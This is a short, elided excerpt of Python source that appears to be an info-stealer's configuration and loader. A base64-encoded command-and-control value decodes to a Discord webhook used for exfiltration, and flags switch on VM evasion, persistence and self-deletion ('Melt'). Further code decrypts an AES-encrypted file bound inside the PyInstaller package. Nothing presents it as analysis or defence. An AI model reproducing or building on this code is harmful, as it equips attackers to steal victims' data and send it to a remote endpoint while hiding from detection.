...
class Settings:
    C2 = (0, base64.b64decode('aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTEzMDg4NTE1MTM4ODM0ODYwOC9pUlhjbWVGTVNZTEhhMHhsRTV1bjZvdW9vamVFQmZpNHVOVWZYak85UjYtblNCRWdoeGpYTzl1bU1fMTRWajVDUUJGZA==').decode())
    Mutex = base64.b64decode('c2tJSzhrS1VEWTNJU0NPcQ==').decode()
    PingMe = bool('true')
    Vmprotect = bool('true')
    Startup = bool('')
    Melt = bool('true')
    ...
    if Utility.GetSelf()[1] and (not Utility.IsInStartup()) and os.path.isfile((boundFileSrc := os.path.join(sys._MEIPASS, 'bound.aes'))):
        try:
            ...
            with open(boundFileSrc, 'rb') as file:
                content = file.read()
            decrypted = pyaes.AESModeOfOperationGCM(content[:32], content[32:64]).decrypt(content[64:])
